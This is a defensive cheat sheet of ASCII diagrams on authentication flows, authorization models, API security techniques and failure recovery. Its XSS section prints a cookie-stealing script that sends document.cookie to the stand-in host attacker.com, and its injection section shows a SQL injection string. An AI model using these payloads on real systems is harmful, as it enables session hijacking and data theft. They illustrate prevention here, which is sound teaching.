
======================================================================
# Authentication Methods
======================================================================

# Authentication vs Authorization

┌─────────────────────────────────────────────────────────────────┐
│              AUTHENTICATION VS AUTHORIZATION                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  AUTHENTICATION: "Who are you?"                                │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Verify identity                                   │      │
│  │  - Login, credentials validation                     │      │
│  │  - Returns: Identity confirmed/rejected              │      │
│  │  - Status: 401 Unauthorized on failure              │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  AUTHORIZATION: "What can you do?"                             │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Check permissions                                 │      │
│  │  - Access control, roles, scopes                    │      │
│  │  - Returns: Access granted/denied                    │      │
│  │  - Status: 403 Forbidden on failure                 │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  📌 Common Confusion:                               │      │
│  │  - Authentication method != Authorization framework │      │
│  │  - JWT is token format, not authentication method   │      │
│  │  - OAuth2 is authorization framework, not auth      │      │
│  │  - SSO is UX pattern, not authentication method     │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘

# Basic Authentication Flow

┌─────────────────────────────────────────────────────────────────┐
│                  BASIC AUTHENTICATION                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CLIENT                    SERVER                               │
│    │                         │                                  │
│    │  GET /api/users        │                                  │
│    │────────────────────────►│                                  │
│    │                         │                                  │
│    │  401 Unauthorized      │                                  │
│    │  WWW-Authenticate: Basic│                                  │
│    │◄────────────────────────│                                  │
│    │                         │                                  │
│    │  Prompt user for       │                                  │
│    │  username/password     │                                  │
│    │                         │                                  │
│    │  GET /api/users        │                                  │
│    │  Authorization: Basic  │                                  │
│    │  dXNlcjpwYXNz          │                                  │
│    │────────────────────────►│                                  │
│    │                         │                                  │
│    │       Verify Credentials│                                  │
│    │                         │                                  │
│    │  ┌────────────────────┐│                                  │
│    │  │  Valid: 200 OK     ││                                  │
│    │  │  Invalid: 401      ││                                  │
│    │  └────────────────────┘│                                  │
│    │◄────────────────────────│                                  │
│                                                                 │
│  ⚠️  DRAWBACKS:                                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Base64 is easily reversible (not encryption!)     │      │
│  │  - Only secure with HTTPS                           │      │
│  │  - Rarely used in production                        │      │
│  │  - Credentials sent with every request              │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘


# Digest Authentication

┌─────────────────────────────────────────────────────────────────┐
│                  DIGEST AUTHENTICATION                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CLIENT                    SERVER                               │
│    │                         │                                  │
│    │  GET /api/users        │                                  │
│    │────────────────────────►│                                  │
│    │                         │                                  │
│    │  401 Unauthorized      │                                  │
│    │  WWW-Authenticate:     │                                  │
│    │  Digest realm="api",   │                                  │
│    │  nonce="abc123",       │                                  │
│    │  qop="auth"            │                                  │
│    │◄────────────────────────│                                  │
│    │                         │                                  │
│    │  Compute MD5 hash:     │                                  │
│    │  HA1 = MD5(user:realm:password)                          │
│    │  HA2 = MD5(method:uri)                                   │
│    │  response = MD5(HA1:nonce:HA2)                          │
│    │                         │                                  │
│    │  GET /api/users        │                                  │
│    │  Authorization: Digest │                                  │
│    │  username="user",      │                                  │
│    │  realm="api",          │                                  │
│    │  nonce="abc123",       │                                  │
│    │  response="6629fae..." │                                  │
│    │────────────────────────►│                                  │
│    │                         │                                  │
│    │       Verify Response   │                                  │
│    │                         │                                  │
│    │  ┌────────────────────┐│                                  │
│    │  │  Valid: 200 OK     ││                                  │
│    │  │  Invalid: 401      ││                                  │
│    │  └────────────────────┘│                                  │
│    │◄────────────────────────│                                  │
│                                                                 │
│  ✅ SECURE: Password never sent in clear                       │
│  ❌ COMPLEX: MD5 is considered weak, stateful                  │
└─────────────────────────────────────────────────────────────────┘

# API Key Authentication

┌─────────────────────────────────────────────────────────────────┐
│                   API KEY AUTHENTICATION                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CLIENT/APP                API SERVER          DATABASE        │
│    │                         │                    │             │
│    │  GET /api/users        │                    │             │
│    │  X-API-Key: abc123     │                    │             │
│    │────────────────────────►│                    │             │
│    │                         │                    │             │
│    │                         │  Lookup API key   │             │
│    │                         │───────────────────►│             │
│    │                         │                    │             │
│    │                         │  key_hash, user_id│             │
│    │                         │  scopes, active    │             │
│    │                         │◄───────────────────│             │
│    │                         │                    │             │
│    │       ┌────────────────┴────────────┐       │             │
│    │       │  Valid?                     │       │             │
│    │       │  - Active?                  │       │             │
│    │       │  - Correct scopes?          │       │             │
│    │       └────────────────┬────────────┘       │             │
│    │                         │                    │             │
│    │  ┌────────────────────┐│                    │             │
│    │  │  Valid: 200 OK     ││                    │             │
│    │  │  Invalid: 401      ││                    │             │
│    │  └────────────────────┘│                    │             │
│    │◄────────────────────────│                    │             │
│                                                                 │
│  ✅ Simple, easy to implement                                  │
│  ❌ Hard to manage at scale, no expiration                     │
│  🔧 Recovery: Revoke keys, rate limit per key                  │
└─────────────────────────────────────────────────────────────────┘


# Session-Based Authentication

┌─────────────────────────────────────────────────────────────────┐
│                 SESSION-BASED AUTHENTICATION                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  USER                  WEB SERVER           SESSION STORE     │
│   │                       │                      │              │
│   │  Login with         │                      │              │
│   │  credentials        │                      │              │
│   │─────────────────────►│                      │              │
│   │                       │                      │              │
│   │                       │  Create Session     │              │
│   │                       │─────────────────────►│              │
│   │                       │                      │              │
│   │                       │  Session ID         │              │
│   │                       │◄─────────────────────│              │
│   │                       │                      │              │
│   │  Set Cookie with     │                      │              │
│   │  Session ID          │                      │              │
│   │◄─────────────────────│                      │              │
│   │                       │                      │              │
│   │  Request with        │                      │              │
│   │  Cookie: session_id  │                      │              │
│   │─────────────────────►│                      │              │
│   │                       │                      │              │
│   │                       │  Lookup Session     │              │
│   │                       │─────────────────────►│              │
│   │                       │                      │              │
│   │                       │  User Data          │              │
│   │                       │◄─────────────────────│              │
│   │                       │                      │              │
│   │       ┌────────────────┴────────────┐       │              │
│   │       │  Valid: Process Request     │       │              │
│   │       │  Invalid: 401 Unauthorized  │       │              │
│   │       └────────────────┬────────────┘       │              │
│   │                       │                      │              │
│   │  Authorized Response  │                      │              │
│   │◄─────────────────────│                      │              │
│                                                                 │
│  ✅ Stateful, easy to revoke                                   │
│  ❌ Hard to scale distributed systems                          │
│  🔧 Recovery: Use Redis for session store, load balance        │
└─────────────────────────────────────────────────────────────────┘


# JWT Bearer Token Authentication

┌─────────────────────────────────────────────────────────────────┐
│                JWT BEARER TOKEN AUTHENTICATION                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CLIENT                AUTH SERVER           API SERVER        │
│   │                       │                      │              │
│   │  POST /auth/login   │                      │              │
│   │  username/password  │                      │              │
│   │─────────────────────►│                      │              │
│   │                       │                      │              │
│   │                       │  Validate credentials │              │
│   │                       │                      │              │
│   │  {                   │                      │              │
│   │    access_token:     │                      │              │
│   │    "eyJhbGci..."     │                      │              │
│   │  }                   │                      │              │
│   │◄─────────────────────│                      │              │
│   │                       │                      │              │
│   │  GET /api/users      │                      │              │
│   │  Authorization:      │                      │              │
│   │  Bearer eyJhbGci...  │                      │              │
│   │─────────────────────────────────────────────►│              │
│   │                       │                      │              │
│   │                       │       Verify Token Signature        │
│   │                       │       (Stateless - no DB lookup)    │
│   │                       │                      │              │
│   │       ┌──────────────────────────────────────┐│              │
│   │       │  Valid Token: 200 OK with data      ││              │
│   │       │  Invalid Token: 401 Unauthorized    ││              │
│   │       └──────────────────────────────────────┘│              │
│   │◄─────────────────────────────────────────────│              │
│                                                                 │
│  JWT Structure:                                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Header: {"alg": "HS256", "typ": "JWT"}             │      │
│  │  Payload: {"user_id": 123, "role": "admin", exp}    │      │
│  │  Signature: HMACSHA256(base64Header + base64Payload) │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  ✅ Stateless, self-contained, scalable                       │
│  ❌ Can't revoke individual tokens, size overhead              │
│  🔧 Recovery: Short expiry, refresh tokens, blacklist          │
└─────────────────────────────────────────────────────────────────┘

# Access & Refresh Token Lifecycle

┌─────────────────────────────────────────────────────────────────┐
│              ACCESS & REFRESH TOKEN LIFECYCLE                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CLIENT              AUTH SERVER              API SERVER       │
│   │                     │                         │             │
│   │  Login Request     │                         │             │
│   │────────────────────►│                         │             │
│   │                     │                         │             │
│   │  Access Token:     │                         │             │
│   │  15 min - 1 hour   │                         │             │
│   │  Refresh Token:    │                         │             │
│   │  7 - 30 days       │                         │             │
│   │◄────────────────────│                         │             │
│   │                     │                         │             │
│   │  Request with       │                         │             │
│   │  Access Token       │                         │             │
│   │────────────────────────────────────────────────►│             │
│   │                     │                         │             │
│   │  ┌────────────────────────────────────────────┐│             │
│   │  │  Access Token Expired (401)               ││             │
│   │  └────────────────────────────────────────────┘│             │
│   │◄────────────────────────────────────────────────│             │
│   │                     │                         │             │
│   │  Refresh Token     │                         │             │
│   │  Request            │                         │             │
│   │────────────────────►│                         │             │
│   │                     │                         │             │
│   │  New Access Token   │                         │             │
│   │◄────────────────────│                         │             │
│   │                     │                         │             │
│   │  Request with       │                         │             │
│   │  New Token          │                         │             │
│   │────────────────────────────────────────────────►│             │
│   │                     │                         │             │
│   │  Success with Data  │                         │             │
│   │◄────────────────────────────────────────────────│             │
│                                                                 │
│  🛡️  SECURITY: Store refresh tokens in httpOnly cookies       │
│  ⚠️  NEVER store tokens in localStorage                        │
│  🔧 Recovery: Rotate tokens, detect unusual activity           │
└─────────────────────────────────────────────────────────────────┘

# OAuth 2.0 Authorization Flow

┌─────────────────────────────────────────────────────────────────┐
│                  OAUTH 2.0 AUTHORIZATION FLOW                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  USER              YOUR APP            GOOGLE OAuth            │
│   │                   │                    │                    │
│   │  1. Connect Google│                    │                    │
│   │   Drive           │                    │                    │
│   │──────────────────►│                    │                    │
│   │                   │                    │                    │
│   │  2. Redirect to   │                    │                    │
│   │   Consent Screen  │                    │                    │
│   │◄──────────────────│                    │                    │
│   │                   │                    │                    │
│   │  3. Show          │                    │                    │
│   │   Permission      │                    │                    │
│   │   Request         │                    │                    │
│   │──────────────────►│                    │                    │
│   │                   │  4. Allow Access   │                    │
│   │                   │───────────────────►│                    │
│   │                   │                    │                    │
│   │  5. Return        │  6. Exchange      │                    │
│   │   Auth Code       │   Code for Token  │                    │
│   │◄──────────────────│───────────────────►│                    │
│   │                   │                    │                    │
│   │                   │  7. Return         │                    │
│   │                   │   Access Token     │                    │
│   │                   │◄───────────────────│                    │
│   │                   │                    │                    │
│   │  8. Request       │  9. Access Token   │                    │
│   │   Files with      │   proves app CAN   │                    │
│   │   Token           │   access resources  │                    │
│   │──────────────────►│───────────────────►│                    │
│   │                   │                    │                    │
│   │  10. Return       │                    │                    │
│   │   User Files      │                    │                    │
│   │◄──────────────────│                    │                    │
│                                                                 │
│  ⚠️  OAuth2 is AUTHORIZATION, not AUTHENTICATION                │
│  📌  Access token gives permission to RESOURCES                │
│  🆔  Doesn't identify the user                                 │
└─────────────────────────────────────────────────────────────────┘

# OpenID Connect (OIDC) Authentication Flow

┌─────────────────────────────────────────────────────────────────┐
│                   OIDC AUTHENTICATION FLOW                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  USER              YOUR APP            GOOGLE IDENTITY         │
│   │                   │                    │                    │
│   │  1. Click Sign    │                    │                    │
│   │   In with Google  │                    │                    │
│   │──────────────────►│                    │                    │
│   │                   │                    │                    │
│   │  2. Redirect to   │                    │                    │
│   │   Auth Endpoint   │                    │                    │
│   │◄──────────────────│                    │                    │
│   │                   │                    │                    │
│   │  3. Show Login    │                    │                    │
│   │   Screen          │                    │                    │
│   │──────────────────►│  4. Enter Creds    │                    │
│   │                   │   & Consent       │                    │
│   │                   │───────────────────►│                    │
│   │                   │                    │                    │
│   │  5. Return Auth   │  6. Exchange      │                    │
│   │   Code            │   Code for Tokens │                    │
│   │◄──────────────────│───────────────────►│                    │
│   │                   │                    │                    │
│   │                   │  7. Return Access │                    │
│   │                   │   + ID Token       │                    │
│   │                   │◄───────────────────│                    │
│   │                   │                    │                    │
│   │  8. Send ID       │  9. Identity      │                    │
│   │   Token for       │   Confirmed,      │                    │
│   │   Verification    │   Session Created │                    │
│   │──────────────────►│───────────────────►│                    │
│   │                   │                    │                    │
│   │  10. Logged In    │                    │                    │
│   │   Successfully    │                    │                    │
│   │◄──────────────────│                    │                    │
│                                                                 │
│  ✅ OIDC is AUTHENTICATION on top of OAuth2                    │
│  🆔 ID Token contains user identity claims                     │
│  🔧 Recovery: Handle expired tokens, session refresh           │
└─────────────────────────────────────────────────────────────────┘

# Single Sign-On (SSO)

┌─────────────────────────────────────────────────────────────────┐
│                 SINGLE SIGN-ON (SSO)                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────────────────────────────────────────────────────┐│
│  │                     USER                                  ││
│  │                   1. Login Once                           ││
│  │  ┌──────────────────────────────────────────────────────┐ ││
│  │  │  2. Access Gmail  3. Access Drive  4. Access YouTube│ ││
│  │  └──────────────────────────────────────────────────────┘ ││
│  └─────────────────────────────────────────────────────────────┘│
│                            │                                    │
│                            ▼                                    │
│  ┌─────────────────────────────────────────────────────────────┐│
│  │          IDENTITY PROVIDER (Google, Okta)                 ││
│  │                                                           ││
│  │  ┌────────────────────────────────────────────────────┐   ││
│  │  │              Global Session Store                  │   ││
│  │  │  - Verified Session → Confirmed (no login needed)  │   ││
│  │  └────────────────────────────────────────────────────┘   ││
│  └─────────────────────────────────────────────────────────────┘│
│                            │                                    │
│                            ▼                                    │
│  ┌─────────────────────────────────────────────────────────────┐│
│  │                     APPLICATIONS                           ││
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐                ││
│  │  │  Gmail   │  │  Drive   │  │ YouTube  │                ││
│  │  └──────────┘  └──────────┘  └──────────┘                ││
│  └─────────────────────────────────────────────────────────────┘│
│                                                                 │
│  📌 SSO is a USER EXPERIENCE PATTERN, not an authentication    │
│     method itself                                              │
│  ✅ One login, access to multiple applications                  │
│  ❌ Single point of failure, complex setup                     │
│  🔧 Recovery: Fallback authentication methods                  │
└─────────────────────────────────────────────────────────────────┘



=====================================================================
# Authorization Frameworks
=====================================================================

# Authorization Models Comparison

┌─────────────────────────────────────────────────────────────────┐
│              AUTHORIZATION MODELS                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  RBAC (Role-Based Access Control)                              │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Roles → Permissions                               │      │
│  │                                                    │      │
│  │  ADMIN: create, read, update, delete, manage users  │      │
│  │  EDITOR: create, read, update content               │      │
│  │  VIEWER: read content only                          │      │
│  │                                                    │      │
│  │  Example: GitHub access roles                       │      │
│  │  ✅ Simple to manage, good for orgs                │      │
│  │  ❌ Not flexible for complex scenarios             │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  ABAC (Attribute-Based Access Control)                         │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Policy based on attributes:                        │      │
│  │                                                    │      │
│  │  user.department == "HR" &&                         │      │
│  │  time < 6PM &&                                      │      │
│  │  resource.confidentiality == "internal"             │      │
│  │                                                    │      │
│  │  ✅ Fine-grained, dynamic                           │      │
│  │  ❌ Complex to manage, performance overhead         │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  ACL (Access Control List)                                     │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Each resource has its own permission list          │      │
│  │                                                    │      │
│  │  doc_123.json:                                      │      │
│  │    Alice: Read                                      │      │
│  │    Bob: Read/Write                                  │      │
│  │    Carol: No access                                 │      │
│  │                                                    │      │
│  │  Example: Google Docs sharing                       │      │
│  │  ✅ Granular resource control                      │      │
│  │  ❌ Hard to scale with many resources              │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘

# OAuth2 & JWT Authorization Example

┌─────────────────────────────────────────────────────────────────┐
│            JWT TOKEN WITH AUTHORIZATION                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  JWT Payload Example:                                          │
│  {                                                             │
│    "userID": "user_123",                                       │
│    "roles": ["admin", "editor"],                               │
│    "scopes": ["read:posts", "write:posts", "delete:posts"],   │
│    "expires": "12h",                                           │
│    "issuer": "auth.example.com"                                │
│  }                                                             │
│                                                                 │
│  USER REQUEST:                                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  GET /api/admin/users                               │      │
│  │  Authorization: Bearer eyJhbGci...                  │      │
│  └──────────────────────────────────────────────────────┘      │
│                            │                                    │
│                            ▼                                    │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Authorization Decision:                            │      │
│  │                                                    │      │
│  │  IF role CONTAINS "admin" AND                       │      │
│  │     scope CONTAINS "read:users"                    │      │
│  │  THEN Allow                                        │      │
│  │  ELSE 403 Forbidden                                │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  OAUTH2 DELEGATED AUTHORIZATION:                                │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  User → 3rd Party App → GitHub API                  │      │
│  │        (request access)  (get token)                │      │
│  │                                                    │      │
│  │  💡 OAuth2 = "I allow App X to access my GitHub    │      │
│  │     repositories"                                   │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘

=====================================================================
# API Security Best Practices : 7 Techniques to Protect APIs
=====================================================================

┌─────────────────────────────────────────────────────────────────┐
│                  API SECURITY TECHNIQUES                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. RATE LIMITING                                               │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Per endpoint: 100 req/min                       │      │
│  │  - Per user/IP: 1000 req/hour                     │      │
│  │  - Global: Mitigate DDoS attacks                    │      │
│  │                                                    │      │
│  │  ✅ Prevents abuse, protects resources              │      │
│  │  ❌ Can impact legitimate users                     │      │
│  │  🔧 Recovery: Exponential backoff, retry-after      │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  2. CORS (Cross-Origin Resource Sharing)                        │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Specify allowed origins: *.example.com           │      │
│  │  - Restrict methods: GET, POST, PUT                 │      │
│  │  - Control exposed headers                          │      │
│  │                                                    │      │
│  │  ✅ Prevents unauthorized cross-origin requests     │      │
│  │  ❌ Misconfiguration can cause security issues      │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  3. SQL & NoSQL Injection Prevention                            │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  ✅ Use ORM safeguards                              │      │
│  │  ✅ Parameterized queries                           │      │
│  │  ✅ Input validation and sanitization               │      │
│  │  ❌ Concatenated SQL strings                        │      │
│  │                                                    │      │
│  │  Example Attack:                                    │      │
│  │  SELECT * FROM users WHERE id = '1' OR '1'='1'     │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  4. Web Application Firewalls (WAF)                           │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Block suspicious keywords                         │      │
│  │  - Filter strange HTTP methods                      │      │
│  │  - Block SQL injection attempts                     │      │
│  │                                                    │      │
│  │  ✅ Protects against known attacks                  │      │
│  │  ❌ Can block legitimate traffic (false positives)   │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  5. VPNs & Private Networks                                    │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Internal APIs accessible only via private IPs     │      │
│  │  - Required for sensitive infrastructure            │      │
│  │                                                    │      │
│  │  ✅ Reduces attack surface                          │      │
│  │  ❌ Complicates development access                   │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  6. CSRF (Cross-Site Request Forgery) Protection               │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  - Session cookies (same-site)                      │      │
│  │  - CSRF tokens required                             │      │
│  │  - Double-submit cookies                            │      │
│  │                                                    │      │
│  │  ✅ Prevents unauthorized state-changing requests   │      │
│  │  ❌ Adds complexity to APIs                         │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  7. XSS (Cross-Site Scripting) Prevention                      │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  Example Attack:                                    │      │
│  │  <script>fetch('https://attacker.com/steal?c='+    │      │
│  │          document.cookie);</script>                  │      │
│  │                                                    │      │
│  │  ✅ Sanitize user input                             │      │
│  │  ✅ Escape output (HTML encode)                     │      │
│  │  ✅ Content Security Policy (CSP)                   │      │
│  │  ❌ No trust of user input                          │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘

=======================================================================
# Error Recovery & Graceful Degradation : Failure Scenarios & Recovery
=======================================================================

┌─────────────────────────────────────────────────────────────────┐
│                   FAILURE RECOVERY STRATEGIES                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SCENARIO 1: Database Failure                                   │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  🔴 Problem: Primary DB goes down                   │      │
│  │  ✅ Recovery:                                      │      │
│  │    1. Auto-failover to replica                      │      │
│  │    2. Read-only mode while replicating              │      │
│  │    3. Return cached stale data if acceptable        │      │
│  │    4. Queue writes for later sync                   │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  SCENARIO 2: Cache Failure                                     │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  🔴 Problem: Redis crashes                          │      │
│  │  ✅ Recovery:                                      │      │
│  │    1. Circuit breaker trips                         │      │
│  │    2. Fall back to database                         │      │
│  │    3. Monitor database load                         │      │
│  │    4. Gradually warm cache                          │      │
│  │    5. Implement cache stampede protection           │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  SCENARIO 3: Service Unavailable                               │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  🔴 Problem: Microservice down                      │      │
│  │  ✅ Recovery:                                      │      │
│  │    1. Retry with exponential backoff                │      │
│  │    2. Return cached or default response             │      │
│  │    3. Queue requests for later processing           │      │
│  │    4. Degrade functionality gracefully              │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  SCENARIO 4: Rate Limiting Hit                                 │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  🔴 Problem: User exceeds rate limit                │      │
│  │  ✅ Recovery:                                      │      │
│  │    1. Return 429 with Retry-After header            │      │
│  │    2. Client implements exponential backoff         │      │
│  │    3. Request queuing with priority                 │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
│  SCENARIO 5: Authentication Failure                            │
│  ┌──────────────────────────────────────────────────────┐      │
│  │  🔴 Problem: JWT token expired                      │      │
│  │  ✅ Recovery:                                      │      │
│  │    1. Use refresh token to get new access token     │      │
│  │    2. Re-authenticate user                          │      │
│  │    3. Fallback to session-based authentication      │      │
│  └──────────────────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘